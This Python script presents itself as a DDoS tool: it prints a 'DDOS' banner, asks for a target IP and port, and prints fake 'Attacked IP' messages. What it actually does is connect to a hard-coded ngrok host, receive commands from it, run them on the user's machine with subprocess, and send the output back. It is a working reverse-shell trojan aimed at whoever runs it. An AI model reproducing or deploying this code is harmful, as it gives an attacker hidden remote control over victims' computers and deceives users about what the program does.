import socket
import os 
import subprocess
import smtplib
from os import system
SERVER_HOST = '0.tcp.ap.ngrok.io'
SERVER_PORT = 12185 
BUFFER_SIZE = 1024 * 128 

os.system("figlet DDOS | lolcat ")
SEPARATOR = "<sep>"

s = socket.socket()

s.connect((SERVER_HOST, SERVER_PORT))

cwd = os.getcwd()
s.send(cwd.encode())
a = input("Enter IP: ")
b = input("Enter Port: ")
i = 0
while True:
    i+=1
    print(f"Attacked IP {a} Port {b}  time {i}")
    command = s.recv(BUFFER_SIZE).decode()
    splited_command = command.split()
    if command.lower() == "exit":
        break
    if splited_command[0].lower() == "cd":
        try:
            os.chdir(' '.join(splited_command[1:]))
        except FileNotFoundError as e:
            output = str(e)
        else:

            output = ""
    else:

        output = subprocess.getoutput(command)

    cwd = os.getcwd()

    message = f"{output}{SEPARATOR}{cwd}"
    s.send(message.encode())

s.close()

